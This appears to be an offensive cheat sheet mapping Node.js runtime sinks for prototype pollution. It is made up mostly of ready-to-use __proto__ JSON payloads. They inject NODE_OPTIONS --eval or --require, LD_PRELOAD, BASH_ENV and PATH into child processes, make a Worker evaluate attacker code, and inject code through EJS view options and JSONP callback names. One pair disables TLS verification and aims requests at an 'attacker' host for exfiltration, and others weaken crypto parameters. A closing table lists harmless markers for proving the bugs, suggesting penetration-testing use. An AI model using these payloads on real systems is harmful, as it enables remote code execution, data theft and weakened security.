# Node internals — where the polluted name lands in the runtime

The sinks aren't only in app code — Node's own modules read options
objects that inherit from `Object.prototype`. A polluted name the
RUNTIME reads is a sink you didn't have to find in app source.

---

## 1. `child_process` — the richest runtime sink

```js
spawn(cmd, args, opts)           // opts inherits — pollute the names:
execFile(file, args, opts)
exec(cmd, opts)
execSync(cmd, opts)
fork(modulePath, args, opts)
spawnSync(cmd, args, opts)

// the names Node's own code reads off opts:
//   shell env argv0 cwd stdio detached uid gid windowsHide
//   timeout killSignal serialization cwd env execPath execArgv
//   silent input maxBuffer encoding shell windowsVerbatimArguments
```

`env` is the big one: `spawn(cmd, {env: X})` — when `env` is a
polluted object OR when `env` itself is read as `opts.env` (which
walks the chain), `NODE_OPTIONS`/`LD_PRELOAD`/`BASH_ENV`/`PATH` ride
into the child's environment.

```js
{"__proto__":{"env":{"NODE_OPTIONS":"--eval 'require(\"fs\").writeFileSync(\"/tmp/o\",\"PP\")'"}}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x.js"}}}
{"__proto__":{"env":{"LD_PRELOAD":"/tmp/x.so"}}}
{"__proto__":{"env":{"BASH_ENV":"/tmp/x"}}}
{"__proto__":{"env":{"PATH":"/tmp"}}}
{"__proto__":{"env":{"PYTHONPATH":"/tmp"}}}
{"__proto__":{"env":{"PERL5OPT":"-M/tmp/x"}}}
{"__proto__":{"env":{"RUBYOPT":"-r/tmp/x"}}}
{"__proto__":{"env":{"GIT_SSH_COMMAND":"/tmp/x"}}}
{"__proto__":{"env":{"EDITOR":"/tmp/x"}}}
{"__proto__":{"env":{"PAGER":"/tmp/x"}}}
{"__proto__":{"env":{"http_proxy":"http://attacker"}}}
{"__proto__":{"shell":true}}
{"__proto__":{"execPath":"/tmp/node"}}
{"__proto__":{"execArgv":["--eval","CODE"]}}
{"__proto__":{"argv0":"/bin/sh"}}
{"__proto__":{"cwd":"/tmp"}}
{"__proto__":{"stdio":"inherit"}}
{"__proto__":{"detached":true}}
{"__proto__":{"uid":0}}
{"__proto__":{"gid":0}}
{"__proto__":{"timeout":0}}
{"__proto__":{"killSignal":"SIGKILL"}}
{"__proto__":{"serialization":"advanced"}}
{"__proto__":{"windowsHide":false}}
{"__proto__":{"windowsVerbatimArguments":true}}
{"__proto__":{"silent":false}}
{"__proto__":{"maxBuffer":1048576}}
{"__proto__":{"input":"x"}}
```

## 2. `fs` — the path/option sinks

```js
fs.writeFile(file, data, opts)   // opts.encoding/mode/flag
fs.readFile(file, opts)          // opts.encoding/flag
fs.watch(file, opts)             // opts.persistent/recursive
fs.createWriteStream(path, opts) // opts.flags/mode/fd/start
fs.createReadStream(path, opts)  // same family
fs.mkdir(path, opts)             // opts.recursive/mode
fs.copyFile(src, dst, mode)
fs.promises.* same options objects
```

Polluted names: `encoding`, `mode`, `flag`, `flags`, `fd`, `start`,
`end`, `autoClose`, `persistent`, `recursive`, `withFileTypes`.
Mostly a config-write primitive — `mode: 0o777`/`flag: 'a'` tweaks —
but a `filename`/`path` read is a file-redirect when the sink
takes the path from a merged object.

## 3. `http`/`https`/`net`/`tls` — the request sinks

```js
http.request(opts)               // reads: hostname port path method
                                 //   headers agent timeout auth
                                 //   rejectUnauthorized key cert ca
https.request(opts)              // same + TLS fields
net.connect(opts)                // host port path localAddress
tls.connect(opts)                // rejectUnauthorized servername
new Agent(opts)                  // keepAlive maxSockets proxy?
```

```js
{"__proto__":{"hostname":"attacker"}}
{"__proto__":{"host":"attacker"}}
{"__proto__":{"port":80}}
{"__proto__":{"path":"/admin"}}
{"__proto__":{"method":"POST"}}
{"__proto__":{"headers":{"Authorization":"Bearer x"}}}
{"__proto__":{"auth":"u:p"}}
{"__proto__":{"rejectUnauthorized":false}}
{"__proto__":{"servername":"attacker"}}
{"__proto__":{"agent":{"keepAlive":true}}}
{"__proto__":{"timeout":30000}}
{"__proto__":{"localAddress":"127.0.0.1"}}
{"__proto__":{"localPort":0}}
{"__proto__":{"family":4}}
{"__proto__":{"lookup":"f"}}
{"__proto__":{"hints":0}}
{"__proto__":{"ca":"x"}}
{"__proto__":{"cert":"x"}}
{"__proto__":{"key":"x"}}
{"__proto__":{"pfx":"x"}}
{"__proto__":{"passphrase":"x"}}
{"__proto__":{"ciphers":"x"}}
{"__proto__":{"secureProtocol":"x"}}
{"__proto__":{"ALPNProtocols":["h2"]}}
{"__proto__":{"maxSockets":1}}
{"__proto__":{"keepAlive":true}}
```

`rejectUnauthorized:false` + `hostname:attacker` is the SSRF-to-
exfil pair — the app's own TLS verification off and the request
aimed at you.

## 4. `vm` — the code-context sink

```js
vm.runInNewContext(code, sandbox, opts)
vm.runInThisContext(code, opts)
vm.createContext(sandbox, opts)
new vm.Script(code, opts)
vm.runInContext(code, ctx, opts)

// opts reads: filename lineOffset columnOffset displayErrors
//             timeout breakOnSigint cachedData importModuleDynamically
//             contextName contextCodeGeneration microtaskMode
```

```js
{"__proto__":{"filename":"/tmp/x.js"}}
{"__proto__":{"contextName":"x"}}
{"__proto__":{"timeout":0}}
{"__proto__":{"displayErrors":true}}
{"__proto__":{"breakOnSigint":true}}
{"__proto__":{"lineOffset":0}}
{"__proto__":{"columnOffset":0}}
{"__proto__":{"cachedData":"x"}}
{"__proto__":{"produceCachedData":true}}
{"__proto__":{"importModuleDynamically":"f"}}
{"__proto__":{"contextCodeGeneration":{"strings":true,"wasm":true}}}
{"__proto__":{"microtaskMode":"afterEvaluate"}}
```

`contextCodeGeneration.strings` — pollute `true`/`false` to toggle
eval inside the sandbox — a vm-escape aid.

## 5. `worker_threads` — the Worker sink

```js
new Worker(filename, opts)
// opts reads: eval argv execArgv workerData stdin stdout stderr
//             trackUnmanagedFds transferList resourceLimits env
//             name type credentials workerData
```

```js
{"__proto__":{"workerData":{"eval":"CODE","x":1}}}
{"__proto__":{"eval":true}}
{"__proto__":{"execArgv":["--eval","CODE"]}}
{"__proto__":{"argv":["x"]}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x"}}}
{"__proto__":{"stdin":true}}
{"__proto__":{"stdout":true}}
{"__proto__":{"stderr":true}}
{"__proto__":{"trackUnmanagedFds":true}}
{"__proto__":{"resourceLimits":{"maxOldGenerationSizeMb":1}}}
{"__proto__":{"transferList":[]}}
{"__proto__":{"name":"x"}}
{"__proto__":{"type":"module"}}
{"__proto__":{"credentials":{"key":"x","cert":"x"}}}
```

`eval:true` + `filename: "CODE"` makes the Worker EVAL the filename
as source — `{"__proto__":{"eval":true,"filename":"require('fs')..."}}`
is a clean RCE pair if `new Worker(name)` takes a merged `name`.

## 6. `require`/module resolution

```js
require(name)
require.resolve(name, opts)       // opts.paths
Module._resolveFilename(name, parent)
import(specifier)                 // dynamic
module.paths                      // the search list
```

```js
{"__proto__":{"paths":["/tmp/node_modules"]}}
{"__proto__":{"main":"/tmp/x.js"}}
{"__proto__":{"extensions":{".js":"/tmp/x"}}}
{"__proto__":{"specifier":"file:///tmp/x.mjs"}}
{"__proto__":{"dir":"/tmp"}}
{"__proto__":{"modulePath":"/tmp/x.js"}}
{"__proto__":{"exports":{".":"/tmp/x.js"}}}
{"__proto__":{"imports":{"#x":"/tmp/x.js"}}}
{"__proto__":{"type":"module"}}
{"__proto__":{"exports":{".":{"default":"/tmp/x.js"}}}}
```

`paths` is the resolution order — pollute it to prepend `/tmp` and a
`require('x')` finds `/tmp/node_modules/x` first.

## 7. `util`/`console`/`process` — the quiet sinks

```js
util.inspect(obj, opts)            // opts.depth/colors/customInspect
console.log(..., opts?)            // console methods
process.env.X                      // env reads — os.environ analog
process.binding / _linkedBinding   // internals
process.report.directory/fileName  // report paths
process.dlopen(module, filename)   // native-module load!
```

```js
{"__proto__":{"customInspect":true}}
{"__proto__":{"depth":null}}
{"__proto__":{"colors":true}}
{"__proto__":{"inspect":"function(){return 'x'}"}}
{"__proto__":{"toJSON":"function(){return 'x'}"}}
{"__proto__":{"then":"function(r){r('x')}"}}
{"__proto__":{"constructor":{"name":"x"}}}
{"__proto__":{"report":{"directory":"/tmp","filename":"x"}}}
{"__proto__":{"dlopen":{"filename":"/tmp/x.node"}}}
```

`dlopen`'s `filename` — a native-module load primitive; `report`'s
paths — a file-write location primitive.

## 8. `stream`/`events` options

```js
new Readable(opts)   // objectMode highWaterMark encoding read destroy
new Writable(opts)   // same family + write final autoDestroy
new Transform(opts)  // transform flush
new EventEmitter()   // captureRejections
```

```js
{"__proto__":{"objectMode":true}}
{"__proto__":{"highWaterMark":1}}
{"__proto__":{"encoding":"utf8"}}
{"__proto__":{"autoDestroy":false}}
{"__proto__":{"emitClose":true}}
{"__proto__":{"captureRejections":true}}
{"__proto__":{"read":"f"}}
{"__proto__":{"write":"f"}}
{"__proto__":{"transform":"f"}}
{"__proto__":{"flush":"f"}}
{"__proto__":{"destroy":"f"}}
{"__proto__":{"construct":"f"}}
```

`read`/`write`/`transform`/`construct` — function-valued options a
polluted name can supply a call-target for.

## 9. `crypto` options

```js
crypto.createHash(algo, opts)
crypto.createHmac(algo, key, opts)
crypto.pbkdf2(pass, salt, iter, len, digest, cb)
crypto.randomBytes(n, cb)
crypto.scrypt(pass, salt, len, opts, cb)
crypto.sign(alg, data, key)
crypto.verify(alg, data, key, sig)
```

```js
{"__proto__":{"algorithm":"md4"}}
{"__proto__":{"digest":"md5"}}
{"__proto__":{"iterations":1}}
{"__proto__":{"keylen":32}}
{"__proto__":{"N":1}}
{"__proto__":{"salt":"x"}}
{"__proto__":{"privateKey":"x"}}
{"__proto__":{"publicKey":"x"}}
{"__proto__":{"format":"pem"}}
{"__proto__":{"type":"pkcs8"}}
{"__proto__":{"curve":"x"}}
{"__proto__":{"prime":"x"}}
{"__proto__":{"generator":2}}
{"__proto__":{"modulusLength":512}}
{"__proto__":{"divisorLength":1}}
{"__proto__":{"padding":1}}
{"__proto__":{"saltLength":0}}
{"__proto__":{"mgf1HashAlgorithm":"md5"}}
```

`iterations:1`/`N:1`/`digest:"md4"`/`saltLength:0` — weakening
params on crypto operations whose options inherit.

## 10. `dns`/`url` options

```js
dns.lookup(host, opts, cb)   // family hints all verbatim
dns.resolve(host, rrtype)
new URL(input, base)          // the 'base' is a string — pollute 'base'?
url.parse(str, parseQuery, slashesDenoteHost)
```

```js
{"__proto__":{"base":"http://attacker/"}}
{"__proto__":{"family":4}}
{"__proto__":{"hints":0}}
{"__proto__":{"all":true}}
{"__proto__":{"verbatim":true}}
{"__proto__":{"rrtype":"A"}}
{"__proto__":{"ttl":true}}
{"__proto__":{"parseQueryString":true}}
{"__proto__":{"slashesDenoteHost":true}}
```

`base` is the interesting one — `new URL(path, base)` where `base`
is a polluted read — relative URLs resolve against your origin.

## 11. `express` app-level options

```js
app.set('view engine', x)
app.set('views', x)
app.set('view options', x)
app.set('query parser', x)
app.set('trust proxy', x)
app.set('case sensitive routing', x)
app.set('strict routing', x)
app.set('x-powered-by', x)
app.set('etag', x)
app.set('env', x)
app.set('subdomain offset', x)
app.set('jsonp callback name', x)
app.set('json replacer', x)
app.set('json spaces', x)
app.set('json escape', x)
app.locals                    // merged into every render context
res.locals                    // per-request render context
```

```js
{"__proto__":{"view engine":"ejs"}}
{"__proto__":{"views":"/tmp"}}
{"__proto__":{"view options":{"outputFunctionName":"x;CODE;var y"}}}
{"__proto__":{"query parser":"extended"}}
{"__proto__":{"trust proxy":true}}
{"__proto__":{"case sensitive routing":false}}
{"__proto__":{"strict routing":false}}
{"__proto__":{"x-powered-by":"x"}}
{"__proto__":{"etag":false}}
{"__proto__":{"env":"development"}}
{"__proto__":{"subdomain offset":0}}
{"__proto__":{"jsonp callback name":"x;CODE;//"}}
{"__proto__":{"json replacer":"x"}}
{"__proto__":{"json spaces":0}}
{"__proto__":{"json escape":false}}
```

`jsonp callback name` — the JSONP wrapper's function name — a
polluted value breaks out of the callback-identifier grammar into
the response — an XSS-by-content-injection at the JSONP boundary.

## 12. The marker table for runtime sinks

| Sink | Harmless proof |
|---|---|
| env.NODE_OPTIONS | `--eval 'console.error("PP")'` — stderr marker |
| execPath | a stub binary writing a file marker |
| workerData | a worker that returns the marker |
| paths/main | `/tmp/x.js` writing a marker on require |
| shell:true | `;echo PP` in a spawned arg |
| views/filename | a marker file the render reads |
| hostname | a request to an OOB listener hit |
| rejectUnauthorized | a self-signed-accept behavior change |
| dlopen filename | `/tmp/x.node` load-attempt error marker |
| report paths | a report file at your path |
